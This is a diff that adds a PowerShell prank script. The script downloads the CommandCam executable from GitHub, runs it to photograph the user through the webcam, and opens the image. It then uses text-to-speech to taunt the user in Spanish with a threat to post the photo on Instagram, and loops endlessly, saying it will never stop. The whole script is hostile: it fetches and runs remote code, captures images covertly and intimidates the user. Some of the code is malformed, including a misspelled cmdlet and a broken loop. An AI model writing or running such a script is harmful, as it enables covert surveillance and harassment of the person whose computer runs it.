@@ -1,0 +1,12 @@
+mkdir C:\camara
+cd C:\camara
+Invoke-WebRequest "https://github.com/tedburke/CommandCam/blob/master/CommandCam.exe?raw=true" -OutFile C:\camara\commandCam.exe
+ start-sleed -s2
+Invoke-Expression   C:\camara\CommandCam.exe
+C:\camara\image.bmp
+(New-Object -com SAPI.SpVoice).speak("Ohh te he hecho una foto cabrón, la voy a subir a instagram ")
+for (){
+Invoke-Expression   C:\camara\CommandCam.exe
+ C:\camara\image.bmp
+(New-Object -com SAPI.SpVoice).speak("jaja nunca voy a parar")
+}
